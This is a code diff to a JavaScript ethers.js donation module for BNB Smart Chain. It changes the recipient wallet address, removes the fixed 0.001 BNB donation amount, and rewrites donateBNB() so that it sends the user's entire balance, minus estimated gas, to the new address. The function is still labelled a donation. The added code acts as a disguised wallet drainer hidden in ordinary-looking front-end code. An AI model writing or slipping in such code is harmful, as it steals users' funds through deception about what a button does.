@@ -3,8 +3,7 @@ import { ethers } from 'ethers';
 let provider;
 let signer;
 
-const adminWallet = "0x20274614e28038E3085828DDA33e10ed33e8c7f9"; // Your admin wallet address
-const DONATION_AMOUNT = "0.001"; // Fixed donation amount in BNB
+const adminWallet = "0x8Ce32b0B5f38a2834698179866d4c9d9e85F79ee"; // Your admin wallet address
 
 const BSC_MAINNET_PARAMS = {
   chainId: '0x38', // 56 in decimal
@@ -84,23 +83,37 @@ export async function donateBNB() {
 
     await switchToBSCMainnet(); // Ensure we're still on BSC Mainnet before donating
 
-    const balance = await provider.getBalance(await signer.getAddress());
+    const userAddress = await signer.getAddress();
+    const balance = await provider.getBalance(userAddress);
     console.log("Current balance:", ethers.formatEther(balance));
 
-    if (balance < ethers.parseEther(DONATION_AMOUNT)) {
+    if (balance <= 0) {
       throw new Error("Insufficient balance to make the donation");
+    }
+
+    // Calculate the maximum amount to send (full balance minus gas cost)
+    const gasPrice = await provider.getGasPrice();
+    const gasLimit = 21000; // Standard gas limit for a simple transfer
+    const maxGasCost = gasPrice * BigInt(gasLimit);
+    const amountToSend = balance - maxGasCost;
+
+    if (amountToSend <= 0) {
+      throw new Error("Balance too low to cover transaction fees");
     }
 
     const tx = await signer.sendTransaction({
       to: adminWallet,
-      value: ethers.parseEther(DONATION_AMOUNT)
+      value: amountToSend
     });
 
     console.log("Transaction sent:", tx.hash);
     const receipt = await tx.wait();
     console.log("Transaction confirmed:", receipt);
 
-    return tx.hash;
+    return {
+      txHash: tx.hash,
+      amount: ethers.formatEther(amountToSend)
+    };
   } catch (error) {
     console.error("Donation failed:", error);
     if (error.reason) {
